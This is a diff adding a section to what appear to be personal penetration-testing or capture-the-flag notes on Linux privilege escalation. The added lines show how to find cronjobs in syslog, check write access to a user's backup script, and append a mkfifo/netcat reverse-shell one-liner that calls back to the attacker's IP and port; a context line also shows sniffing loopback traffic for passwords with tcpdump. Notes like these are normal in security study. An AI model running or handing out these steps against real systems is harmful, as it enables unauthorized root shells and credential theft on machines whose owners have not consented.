@@ -51,6 +51,14 @@ sudo tcpdump -i lo -A | grep "pass" -- extremely nice to run with sudo privs. wi
 INSECURE FILE PERMISSIONS
 
 
+grep "CRON" /var/log/syslog -- shows running cronjobs
+
+cat /home/joe/.scripts/user_backups.sh -- view running crobjob AND ls -lah /home/joe/.scripts/user_backups.sh -- see if you have write access.
+
+Use this script to overwrite cronjob.
+
+echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <myip> <my port) >/tmp/f" >> user_backups.sh
+
 
 
 
